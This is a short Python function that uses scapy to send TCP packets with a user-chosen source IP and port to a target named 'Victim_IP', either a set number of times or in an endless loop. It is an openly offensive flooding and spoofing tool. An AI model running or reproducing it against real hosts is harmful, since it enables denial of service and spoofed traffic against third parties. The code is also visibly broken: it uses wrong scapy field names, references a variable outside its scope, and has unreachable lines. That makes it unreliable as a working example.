def Run(*self, Source_IP, Victim_IP, Source_Port, Victim_Ports, Count, Message):
    from scapy.all import sendp as Send, TCP as tcp, IP as ip
    from time import sleep as Sleep
    from sys import exit as Exit
    print("This Operation Needs Administrator Permission")
    print("Running UAC")
    Victim_Ports = Victim_Ports.split()
    if Count != "-1":
        print("Press Ctrl + C To Stop The Process")
        for i in range(0, Count):
            try:
                IP = ip(src=Source_IP, dst=Victim_IP)
                TCP = tcp(sport=Source_Port, dport=(
                    [Victim_Port for Victim_Port in Victim_Ports]))
                Packet = IP / TCP / Message
                Send(Packet)
                print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
                    Victim_IP, Source_IP, Source_Port, Victim_Port))
            except KeyboardInterrupt:
                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                    i, Victim_IP, Source_IP, Source_Port, Victim_Port))
                break
                Sleep(2)
                Exit(0)
    else:
        i = 0
        while True:
            try:
                print("Press Ctrl + C To Stop The Process")
                IP = ip(source_IP=Source_IP, destination=Victim_IP)
                TCP = tcp(srcport=Source_Port, dstport=(
                    [Victim_Port for Victim_Port in Victim_Ports]))
                Packet = IP / TCP / Message
                Send(Packet)
                print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
                    Victim_IP, Source_IP, Source_Port, Victim_Port))
                i += 1
            except KeyboardInterrupt:
                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                    i, Victim_IP, Source_IP, Source_Port, Victim_Port))
                Sleep(2)
                Exit(0)
